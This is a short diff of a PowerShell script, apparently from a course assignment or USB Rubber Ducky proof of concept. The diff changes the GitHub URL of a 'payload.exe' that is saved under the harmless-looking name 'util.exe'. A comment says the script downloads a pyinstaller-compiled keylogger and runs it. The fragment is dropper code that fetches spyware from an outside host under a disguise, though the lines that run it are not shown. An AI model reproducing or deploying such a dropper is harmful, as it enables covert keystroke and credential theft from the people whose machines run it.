@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/tierChampion/INF8108-TP1-Usb/master/dist/payload.exe"
+$url = "https://raw.githubusercontent.com/tierChampion/DuckyPOC/master/dist/payload.exe"
 $fileName = "util.exe"
 
 # Download keylogger and runs it. It is a python script compiled with pyinstaller.
